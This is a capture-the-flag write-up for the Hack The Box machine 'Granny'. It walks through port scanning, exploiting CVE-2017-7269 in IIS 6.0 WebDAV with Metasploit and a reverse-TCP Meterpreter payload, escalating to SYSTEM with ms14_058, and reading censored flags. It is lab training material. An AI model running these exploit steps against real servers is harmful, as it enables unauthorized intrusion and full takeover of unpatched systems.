# Granny - Hack The Box | Write Up

**Difficulty:** Easy | **OS:** Windows | **Author:** Ph4n3s

---

## 1. Enumeration

First I check that the machine is up:

```bash
ping -c 5 10.129.XX.XX
```

I continue with a full port scan:

```bash
nmap -p- --open -T4 --min-rate 5000 10.129.XX.XX -oN ~/HTB_machines/Granny/ports
```

**Open ports:**

```
80/tcp open  http
```

Only one port is open. I run recon scripts against it:

```bash
nmap -p 80 -sVC -T4 --min-rate 5000 10.129.XX.XX -oN ~/HTB_machines/Granny/targeted
```

**Relevant result:**

```
80/tcp open  http    Microsoft IIS httpd 6.0
| http-webdav-scan: 
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK, PUT
|   Server Type: Microsoft-IIS/6.0
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND SEARCH LOCK UNLOCK PUT
|_http-title: Under Construction
|_http-server-header: Microsoft-IIS/6.0
```

**IIS 6.0 with WebDAV enabled.** This version of IIS ships with Windows Server 2003 and has a known buffer overflow vulnerability in the WebDAV module, specifically in the `ScStoragePathFromUrl` function (**CVE-2017-7269**). The number of available HTTP methods such as `PUT`, `MOVE` or `DELETE` also widens the attack surface.

---

## 2. Exploitation

I open **msfconsole** and search for the matching module:

```bash
msfconsole
search iis_webdav
use exploit/windows/iis/iis_webdav_scstoragepathfromurl
```

I configure the exploit:

```bash
set RHOSTS 10.129.XX.XX
set LHOST tun0
set payload windows/meterpreter/reverse_tcp
run
```

I get a Meterpreter session as `NT AUTHORITY\NETWORK SERVICE`.

---

## 3. Privilege escalation

The `NETWORK SERVICE` user has very limited privileges and cannot access the flags directly. I need to migrate to a more stable process and escalate to SYSTEM.

**I list the processes and migrate to a stable one:**

```bash
meterpreter > ps
meterpreter > migrate <PID>
```

**I look for local escalation vectors:**

```bash
meterpreter > run post/multi/recon/local_exploit_suggester
```

The module identifies several viable exploits. I use **ms14_058**:

```bash
meterpreter > background
use exploit/windows/local/ms14_058_track_popup_menu
set SESSION 1
set LHOST tun0
run
```

I get a new Meterpreter session as `NT AUTHORITY\SYSTEM`.

---

## 4. Post-Exploitation / Flags

From Meterpreter I open a Windows shell:

```bash
meterpreter > shell
```

> On Windows Server 2003 the path is `Documents and Settings`, not `Users`.

**User flag (Lakis):**

```cmd
cd C:\Documents and Settings\Lakis\Desktop
type user.txt
```

```
700c5**************************
```

**Administrator flag:**

```cmd
cd C:\Documents and Settings\Administrator\Desktop
type root.txt
```

```
aa4bf**************************
```

---

## Conclusion

Granny is a machine very similar to Grandpa but with one key difference: here you do not get SYSTEM directly, there is a privilege escalation from `NETWORK SERVICE` that adds an extra step. The entry vector is **CVE-2017-7269**, the same buffer overflow in IIS 6.0 WebDAV that affects unpatched Windows Server 2003.

**Lessons:**
- IIS 6.0 with WebDAV exposed on an unpatched server = critical vulnerability
- `NETWORK SERVICE` is not `SYSTEM` — always verify the context of the initial session
- `local_exploit_suggester` is essential for escalating privileges on old Windows machines
- Systems that are not updated remain vulnerable to exploits more than a decade old

---

> ⚠️ *This write up is for educational purposes. The flags are censored.*
